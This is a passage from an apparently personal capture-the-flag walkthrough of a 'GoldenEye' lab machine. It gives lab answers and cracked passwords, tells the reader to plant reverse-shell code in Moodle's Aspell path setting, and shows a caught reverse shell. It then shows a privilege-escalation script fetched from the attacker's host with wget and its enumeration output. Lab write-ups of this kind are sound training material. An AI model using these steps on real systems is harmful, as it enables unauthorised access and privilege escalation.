Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.146.26.
Ncat: Connection from 10.10.146.26:47580.
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ python -c 'import pty;pty.spawn("/bin/bash")'
<.9/plugins/spellchecker$ python -c 'import pty;pty.spawn("/bin/bash")'      
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ whoami
whoami
www-data

:)
```
![[Pasted image 20230203140952.png]]
![[Pasted image 20230203142017.png]]
![[Pasted image 20230203142329.png]]
![[Pasted image 20230203142530.png]]
If you remembered in some of the emails you discovered, there is the severnaya-station.com website. To get this working, you need up update your DNS records to reveal it.
If you're on Linux edit your "/etc/hosts" file and add:
<machines ip> severnaya-station.com
If you're on Windows do the same but in the "c:\Windows\System32\Drivers\etc\hosts" file
Completed
Once you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir
Completed
Try using the credentials you found earlier. Which user can you login as?
*xenia*
Have a poke around the site. What other user can you find?
*doak*
What was this users password?
pop3 + hydra
*goat*
Use this users credentials to go through all the services you have found to reveal more emails.
Completed
What is the next user you can find from doak?
Emails, emails, emails..
*dr_doak*
What is this users password?
*4England!*
Take a look at their files on the moodle (severnaya-station.com)
Completed
Download the attachments and see if there are any hidden messages inside them?
Use exiftool
Completed
Using the information you found in the last task, login with the newly found user.
Completed
As this user has more site privileges, you are able to edit the moodles settings. From here get a reverse shell using python and netcat.
Take a look into Aspell, the spell checker plugin.
Settings->Aspell->Path to aspell field, add your code to be executed. Then create a new page and "spell check it".
Completed

## Privilege Escalation
Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.
Answer the questions below
```text

```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ nano linuxprivchecker.py
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.146.26 - - [03/Feb/2023 14:29:44] "GET /linuxprivchecker.py HTTP/1.1" 200 

<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ cd /tmp
cd /tmp
www-data@ubuntu:/tmp$ wget http://10.8.19.103:8000/linuxprivchecker.py
wget http://10.8.19.103:8000/linuxprivchecker.py
--2023-02-03 11:29:44--  http://10.8.19.103:8000/linuxprivchecker.py
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 25304 (25K) [text/x-python]
Saving to: 'linuxprivchecker.py'

100%[======================================>] 25,304       122KB/s   in 0.2s   

2023-02-03 11:29:45 (122 KB/s) - 'linuxprivchecker.py' saved [25304/25304]

www-data@ubuntu:/tmp$ chmod +x linuxprivchecker.py

www-data@ubuntu:/tmp$ python linuxprivchecker.py
python linuxprivchecker.py
=================================================================================================
LINUX PRIVILEGE ESCALATION CHECKER
=================================================================================================

[*] GETTING BASIC SYSTEM INFO...

[+] Kernel
    Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014

[+] Hostname
    ubuntu

[+] Operating System
    GoldenEye Systems **TOP SECRET**  \n \l

[*] GETTING NETWORKING INFO...

[+] Interfaces
    eth0      Link encap:Ethernet  HWaddr 02:67:98:7d:e6:0d
    inet addr:10.10.146.26  Bcast:10.10.255.255  Mask:255.255.0.0
    inet6 addr: fe80::67:98ff:fe7d:e60d/64 Scope:Link
    UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
    RX packets:90242 errors:0 dropped:0 overruns:0 frame:0
    TX packets:89020 errors:0 dropped:0 overruns:0 carrier:0
    collisions:0 txqueuelen:1000
    RX bytes:5596225 (5.5 MB)  TX bytes:6666487 (6.6 MB)
    lo        Link encap:Local Loopback
    inet addr:127.0.0.1  Mask:255.0.0.0
    inet6 addr: ::1/128 Scope:Host
    UP LOOPBACK RUNNING  MTU:65536  Metric:1
    RX packets:10096 errors:0 dropped:0 overruns:0 frame:0
    TX packets:10096 errors:0 dropped:0 overruns:0 carrier:0
    collisions:0 txqueuelen:0
    RX bytes:5848792 (5.8 MB)  TX bytes:5848792 (5.8 MB)

[+] Netstat
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:55006           0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:55007           0.0.0.0:*               LISTEN      -
    tcp        0    588 10.10.146.26:47580      10.8.19.103:1337        ESTABLISHED 2276/python
    tcp6       0      0 ::1:5432                :::*                    LISTEN      -
    tcp6       0      0 :::25                   :::*                    LISTEN      -
    tcp6       0      0 :::55006                :::*                    LISTEN      -
    tcp6       0      0 :::55007                :::*                    LISTEN      -
    tcp6       0      0 :::80                   :::*                    LISTEN      -
    tcp6       0      0 10.10.146.26:80         10.8.19.103:49914       ESTABLISHED -
    tcp6       0      0 ::1:54952               ::1:5432                ESTABLISHED -
    tcp6       0      0 ::1:5432                ::1:54952               ESTABLISHED -
    udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
    udp        0      0 0.0.0.0:44142           0.0.0.0:*                           -
    udp6       0      0 ::1:42728               ::1:42728               ESTABLISHED -
    udp6       0      0 :::49245                :::*                                -

[+] Route
    Kernel IP routing table
    Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
    default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0
    10.10.0.0       *               255.255.0.0     U     0      0        0 eth0

[*] GETTING FILESYSTEM INFO...

[+] Mount results
    /dev/xvda1 on / type ext4 (rw,errors=remount-ro)
    proc on /proc type proc (rw,noexec,nosuid,nodev)
    sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
    none on /sys/fs/cgroup type tmpfs (rw)
    none on /sys/fs/fuse/connections type fusectl (rw)
    none on /sys/kernel/debug type debugfs (rw)
    none on /sys/kernel/security type securityfs (rw)
    udev on /dev type devtmpfs (rw,mode=0755)
    devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
    tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
    none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
    none on /run/shm type tmpfs (rw,nosuid,nodev)
    none on /run/user type tmpfs (rw,noexec,nosuid,nodev,size=104857600,mode=0755)
    none on /sys/fs/pstore type pstore (rw)
    binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,noexec,nosuid,nodev)
    systemd on /sys/fs/cgroup/systemd type cgroup (rw,noexec,nosuid,nodev,none,name=systemd)

[+] fstab entries
```
```text
# /etc/fstab: static file system information.
    #
```
```text
# Use 'blkid' to print the universally unique identifier for a
```
```text
# device; this may be used with UUID= as a more robust way to name devices
```
```text
# that works even if disks are added and removed. See fstab(5).
    #
```
```text
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
```
```text
# / was on /dev/sda1 during installation
    UUID=204d8d44-a0a5-466b-9163-e9e5f4433231	/	ext4	errors=remount-ro	0 1
```
```text
# swap was on /dev/sda5 during installation
    UUID=b2003a5c-4e37-4edf-bc55-25cd1fe2561d	none	swap	sw	0 0
    #/dev/fd0	/media/floppy0	auto	rw,user,noauto,exec,utf8	0 0

[+] Scheduled cron jobs
    -rw-r--r-- 1 root root  722 Feb  8  2013 /etc/crontab
    /etc/cron.d:
    total 16
    drwxr-xr-x  2 root root 4096 Apr 23  2018 .
    drwxr-xr-x 91 root root 4096 Feb  3 09:47 ..
    -rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
    -rw-r--r--  1 root root  510 Mar 16  2018 php5
    /etc/cron.daily:
    total 68
    drwxr-xr-x  2 root root  4096 Apr 23  2018 .
    drwxr-xr-x 91 root root  4096 Feb  3 09:47 ..
    -rw-r--r--  1 root root   102 Feb  8  2013 .placeholder
    -rwxr-xr-x  1 root root   625 Apr 18  2018 apache2
    -rwxr-xr-x  1 root root 15481 Apr 10  2014 apt
    -rwxr-xr-x  1 root root   314 Feb 17  2014 aptitude
    -rwxr-xr-x  1 root root   355 Jun  4  2013 bsdmainutils
    -rwxr-xr-x  1 root root   256 Mar  7  2014 dpkg
    -rwxr-xr-x  1 root root   372 Jan 22  2014 logrotate
    -rwxr-xr-x  1 root root  1261 Apr 10  2014 man-db
    -rwxr-xr-x  1 root root   435 Jun 20  2013 mlocate
    -rwxr-xr-x  1 root root   249 Feb 16  2014 passwd
    -rwxr-xr-x  1 root root  2417 May 13  2013 popularity-contest
    -rwxr-xr-x  1 root root   328 Jul 18  2014 upstart
    /etc/cron.hourly:
    total 12
    drwxr-xr-x  2 root root 4096 Apr 23  2018 .
    drwxr-xr-x 91 root root 4096 Feb  3 09:47 ..
    -rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
    /etc/cron.monthly:
    total 12
    drwxr-xr-x  2 root root 4096 Apr 23  2018 .
    drwxr-xr-x 91 root root 4096 Feb  3 09:47 ..
    -rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
    /etc/cron.weekly:
    total 24
    drwxr-xr-x  2 root root 4096 Apr 23  2018 .
    drwxr-xr-x 91 root root 4096 Feb  3 09:47 ..
    -rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
    -rwxr-xr-x  1 root root  730 Feb 23  2014 apt-xapian-index
    -rwxr-xr-x  1 root root  427 Apr 16  2014 fstrim
    -rwxr-xr-x  1 root root  771 Apr 10  2014 man-db

[+] Writable cron dirs

[*] ENUMERATING USER AND ENVIRONMENTAL INFO...

[+] Logged in User Activity
    11:30:25 up  1:43,  0 users,  load average: 0.00, 0.01, 0.07
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[+] Super Users Found:
    root

[+] Environment
    SHLVL=2
    OLDPWD=/var/www/html/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker
    APACHE_RUN_DIR=/var/run/apache2
    APACHE_PID_FILE=/var/run/apache2/apache2.pid
    _=/usr/bin/python
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    APACHE_LOCK_DIR=/var/lock/apache2
    LANG=C
    APACHE_RUN_USER=www-data
    APACHE_RUN_GROUP=www-data
    APACHE_LOG_DIR=/var/log/apache2
    PWD=/tmp

[+] Root and current user history (depends on privs)

[+] Sudoers (privileged)

[+] All users
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    libuuid:x:100:101::/var/lib/libuuid:
    syslog:x:101:104::/home/syslog:/bin/false
    messagebus:x:102:105::/var/run/dbus:/bin/false
    boris:x:1000:1000:boris,,,:/home/boris:/usr/sbin/nologin
    dovecot:x:103:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
    dovenull:x:104:113:Dovecot login user,,,:/nonexistent:/bin/false
    postfix:x:105:114::/var/spool/postfix:/bin/false
    postgres:x:106:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    natalya:x:1002:1002:,,,:/home/natalya:/usr/sbin/nologin
    doak:x:1001:1001:,,,:/home/doak:/usr/sbin/nologin

[+] Current User
    www-data

[+] Current User ID
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...

[+] World Writeable Directories for User/Group 'Root'
    drwxrwxrwt 4 root root 4096 Feb  3 11:29 /tmp
    drwxrwxrwt 2 root root 4096 Feb  3 09:47 /tmp/.X11-unix
    drwxrwxrwt 2 root root 4096 Feb  3 09:47 /tmp/.ICE-unix
    drwxrwxrwt 2 root root 40 Feb  3 09:47 /run/shm
    drwxrwxrwt 3 root root 60 Feb  3 09:48 /run/lock
    drwxrwxrwt 2 root root 4096 Apr 23  2018 /var/tmp
    drwx-wx-wt 3 root root 4096 Apr 23  2018 /var/lib/php5

[+] World Writeable Directories for Users other than Root
    drwxrwsrwx 7 www-data www-data 4096 Apr 23  2018 /var/www/moodledata
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/trashdir
    drwxrwsrwx 6 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/js
    drwxrwsrwx 3 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/lang
    drwxrwsrwx 2 www-data www-data 12288 Feb  3 11:17 /var/www/moodledata/cache/lang/en
    drwxrwsrwx 3 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/theme
    drwxrwsrwx 4 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/theme/standard
    drwxrwsrwx 21 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_randomsamatch
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_numerical
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_shortanswer
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_multianswer
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_user
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_match
    drwxrwsrwx 7 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/u
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/a
    drwxrwsrwx 2 www-data www-data 4096 Feb  3 10:57 /var/www/moodledata/cache/theme/standard/pix/moodle/t
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/f
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_truefalse
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_upload
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculatedsimple
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_essay
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_recent
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculatedmulti
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculated
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_local
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/theme
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/theme/tab
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/forum
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_multichoice
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_description
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/theme/standard/css
    drwxrwsrwx 4 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/htmlpurifier
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/htmlpurifier/HTML
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/htmlpurifier/URI
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/lang
    drwxrwsrwx 4 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp/typo3temp
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp/typo3temp/cs
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp/forms
    drwxrwsrwx 6 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/82
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/82/34
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/a6
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/a6/f9
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/ad
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/ad/5c
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/da
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/da/39

[+] World Writable Files
    -rwxrwxrwx 1 www-data www-data 25304 Feb  3 11:29 /tmp/linuxprivchecker.py
    -rw-rw-rw- 1 www-data www-data 8107 Apr 25  2018 /var/www/moodledata/cache/js/minify_9b2e0498e8b0324830c52b585d61d9d0
    -rw-rw-rw- 1 www-data www-data 2188 Apr 25  2018 /var/www/moodledata/cache/js/minify_9b2e0498e8b0324830c52b585d61d9d0.gz
    -rw-rw-rw- 1 www-data www-data 1309 Apr 24  2018 /var/www/moodledata/cache/js/minify_e6df61697e42dfd2c4038788f632b50d.gz
    -rw-rw-rw- 1 www-data www-data 4291 Apr 24  2018 /var/www/moodledata/cache/js/minify_4e80f058aff2d8a2b8d52146da462c74.gz
    -rw-rw-rw- 1 www-data www-data 9823 Apr 23  2018 /var/www/moodledata/cache/js/minify_eec518a0dda5a67f3a056f40e92c7e21.gz
    -rw-rw-rw- 1 www-data www-data 35177 Apr 24  2018 /var/www/moodledata/cache/js/minify_bbe4f978fd00f80385dabb50369f5724
    -rw-rw-rw- 1 www-data www-data 16710 Apr 24  2018 /var/www/moodledata/cache/js/minify_4e80f058aff2d8a2b8d52146da462c74
    -rw-rw-rw- 1 www-data www-data 2163 Apr 24  2018 /var/www/moodledata/cache/js/minify_b8bd2995a4274eadd45998e1500f98d1
    -rw-rw-rw- 1 www-data www-data 374 Apr 24  2018 /var/www/moodledata/cache/js/minify_f0324aaed00ab522adfef63f52e04c19.gz
    -rw-rw-rw- 1 www-data www-data 1761 Apr 24  2018 /var/www/moodledata/cache/js/minify_9432984ad43465dc39ce4ee74814371a.gz
    -rw-rw-rw- 1 www-data www-data 5969 Apr 23  2018 /var/www/moodledata/cache/js/minify_43c0a2539b50ca07023e5aa00f3d21ef.gz
    -rw-rw-rw- 1 www-data www-data 829 Apr 24  2018 /var/www/moodledata/cache/js/minify_b8bd2995a4274eadd45998e1500f98d1.gz
    -rw-rw-rw- 1 www-data www-data 24468 Apr 25  2018 /var/www/moodledata/cache/js/minify_ec62647c1a86c40a73f3e9d932db7d1b
    -rw-rw-rw- 1 www-data www-data 3831 Apr 25  2018 /var/www/moodledata/cache/js/minify_7c0a0992224807c264a4100b8ad73166
